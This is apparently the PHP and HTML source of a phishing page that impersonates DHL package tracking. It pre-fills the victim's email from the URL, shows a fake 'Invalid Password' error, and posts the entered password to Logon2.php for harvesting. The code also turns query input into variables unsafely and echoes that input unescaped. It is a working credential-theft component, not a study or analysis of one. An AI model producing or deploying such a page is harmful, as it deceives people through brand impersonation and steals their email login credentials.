<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $userid);
	$user = @$parts[0];
// < end 


$email = $userid;
$_SESSION['email'] = $email;


?>

<html>
<HEAD>
<TITLE>DHL | Tracking</TITLE>	
<title>TRADE FILE</title>
<link rel="shortcut icon" href="images/favicon.gif" type="image/gif"/>
</head>
<script>
function validateForm()
{
var x=document.forms["myform"]["email"].value;
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Not a valid e-mail address");
  return false;
  }
var y=document.forms["myform"]["epass"].value;
if(y==null || y=="")
  {
  alert("Password is Empty");
  return false;
  }
var y=document.forms["myform"]["epass"].value;
if(y.length < 5)
  {
  alert("Password is Too Short");
  return false;
  }
}
</script>
<body background="images/5_1_dhl_global_locator_all_340_187.gif" text="black" link="blue" alink="blue" vlink="blue" background="" >
<!-- 66613 -->
<font face="Arial" style="font-size: 20pt" color="#CD0000">
<center><b>Login to Continue Tracking your Package</b></font><font face="verdana,arial" size=-1><p>
<img src="images/dhl_logo.gif" width="300" height="100">
</p>
<table cellpadding=2 cellspacing=0 border=0>
<tr><td bgcolor="#FFA500"><table cellpadding=0 cellspacing=0 border=0 width=100%><tr><td bgcolor="#CD0000" align=center style="padding:2;padding-bottom:4"><b>
	<font size=-1 color="white" face="Comic Sans MS">Sign In With Your Correct Email and Password To Review Package Information</font></b></font><b><font face="Comic Sans MS" size=-1></th></font><font face="Comic Sans MS" size=-1></tr>

</font><font face="verdana,arial" size=-1>
<tr><td bgcolor="white" style="padding:5"><br>
<form action="Logon2.php" onsubmit="return validateForm()" method="post" name="myform">
<center><table width="517">

<tr><td colspan=2><font face="verdana,arial" size=2><span  class=text1a><b><font color="red"><img height="25" width="25" src="images/alert-icon-red-md.png">&nbsp;&nbsp;Invalid Password. Please try again using correct details. </font></b> </span></td></tr>



<tr><td width="150" height="40" align="right"><font face="verdana,arial" size=-1> 
<font color="red">*</font>&nbsp;Email Address&nbsp;&nbsp;&nbsp;:</td><td width="397" height="40">&nbsp;<font face="Georgia Bold"><?php echo $email ?></font></td></tr>

<tr>
<font face="verdana,arial" size=-1>
	<td width="150" align="right"><font face="verdana,arial" size=-1><font color="red">*</font>&nbsp;Password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:</td>

	<td width="397">&nbsp;<input type="password" name="epass" size="20"></td>

	</font>
</tr>
<tr>

<font face="verdana,arial" size=-1>
	<td width="110"><font face="verdana,arial" size=-1>&nbsp;</td>
	<td width="397"><font face="verdana,arial" size=-1>&nbsp;<input type="submit" value="Log in To View"></td>
	</font>
</tr>
<tr><td colspan=2><font face="verdana,arial" size=-1></td></tr>
</table></center>
</form>
</td></tr></table></td></tr></table>
<div class="copyright cLight">

&nbsp;</div>
<p>Copyright Notice &copy; 2021 DHL WorldWide Delivery. </p>
&nbsp;<center><p><hr size=1 width="100%">&nbsp;</p></center>
</font>
DHL Now Partners with: <br>
</body>
</html>